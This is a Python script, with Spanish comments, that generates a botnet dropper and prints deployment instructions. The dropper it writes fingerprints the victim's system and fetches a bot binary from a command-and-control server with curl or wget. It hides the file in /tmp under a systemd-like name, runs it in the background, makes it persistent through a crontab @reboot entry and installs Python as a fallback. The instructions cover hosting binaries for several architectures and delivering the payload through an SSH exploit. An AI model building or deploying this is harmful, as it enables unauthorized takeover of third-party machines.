"""
Crea un bot "universal" que se adapta al sistema de la víctima.
Incluye binarios embebidos para Linux x86_64, ARM, etc.
"""
import base64
import os

def create_universal_payload():
    """Crea un payload shell que se adapta al sistema."""
    
    universal_script = """#!/bin/sh
# Universal bot payload - NO requiere Python

# Detectar sistema y arquitectura
OS=$(uname -s | tr '[:upper:]' '[:lower:]')
ARCH=$(uname -m)

# URL del servidor C2
C2_SERVER="YOUR_SERVER_IP:8000"

# Intentar descargar binario apropiado
BOT_NAME=".systemd-${OS}-${ARCH}"
DOWNLOAD_URL="http://${C2_SERVER}/bots/${OS}/${ARCH}/bot"

cd /tmp

# Intentar con curl o wget
if command -v curl >/dev/null 2>&1; then
    curl -s -o "${BOT_NAME}" "${DOWNLOAD_URL}"
elif command -v wget >/dev/null 2>&1; then
    wget -q -O "${BOT_NAME}" "${DOWNLOAD_URL}"
else
    # Fallback: usar script Python embebido
    if command -v python3 >/dev/null 2>&1 || command -v python >/dev/null 2>&1; then
        PYTHON_CMD=$(command -v python3 || command -v python)
        
        # Descargar bot Python
        cat > "${BOT_NAME}.py" << 'EOFPYTHON'
# Bot Python embebido aquí
import socket, ssl, json, time
# ... código minimizado del bot ...
EOFPYTHON
        
        nohup ${PYTHON_CMD} "${BOT_NAME}.py" >/dev/null 2>&1 &
        exit 0
    fi
fi

# Si descargó el binario, ejecutarlo
if [ -f "${BOT_NAME}" ]; then
    chmod +x "${BOT_NAME}"
    
    # Intentar ejecutar
    nohup "./${BOT_NAME}" >/dev/null 2>&1 &
    
    # Verificar que está corriendo
    sleep 2
    if ps aux | grep -q "[.]${BOT_NAME}"; then
        # Agregar persistencia
        (crontab -l 2>/dev/null; echo "@reboot /tmp/${BOT_NAME}") | crontab - 2>/dev/null
        echo "Bot deployed successfully"
        exit 0
    fi
fi

# Si todo falla, instalar Python y reintentar
if command -v apt-get >/dev/null 2>&1; then
    apt-get update -qq && apt-get install -y python3 python3-pip
elif command -v yum >/dev/null 2>&1; then
    yum install -y python3 python3-pip
fi

# Reintentar descarga de script Python
# ... código de fallback ...

exit 1
"""
    
    with open("universal_payload.sh", "w") as f:
        f.write(universal_script)
    
    print("[+] Payload universal creado: universal_payload.sh")
    print("\n[*] Este script:")
    print("  1. Detecta el sistema de la víctima")
    print("  2. Descarga el binario apropiado")
    print("  3. Si falla, usa Python como fallback")
    print("  4. Si no hay Python, intenta instalarlo")
    print("  5. Agrega persistencia con crontab")

if __name__ == "__main__":
    print("="*70)
    print("       BOT UNIVERSAL - Sin dependencias de Python")
    print("="*70 + "\n")
    
    create_universal_payload()
    
    print("\n" + "="*70)
    print("       INSTRUCCIONES")
    print("="*70)
    print("\n1. Compila bots para diferentes arquitecturas:")
    print("   python compile_bot.py")
    print("\n2. Organiza binarios en tu servidor:")
    print("   bots/")
    print("   ├── linux/")
    print("   │   ├── x86_64/bot")
    print("   │   ├── armv7l/bot")
    print("   │   └── aarch64/bot")
    print("   └── darwin/")
    print("       └── x86_64/bot")
    print("\n3. Inicia servidor HTTP:")
    print("   python -m http.server 8000")
    print("\n4. Usa en exploit_ssh:")
    print("   payload_url = 'http://tu-ip:8000/universal_payload.sh'")
    print("="*70 + "\n")
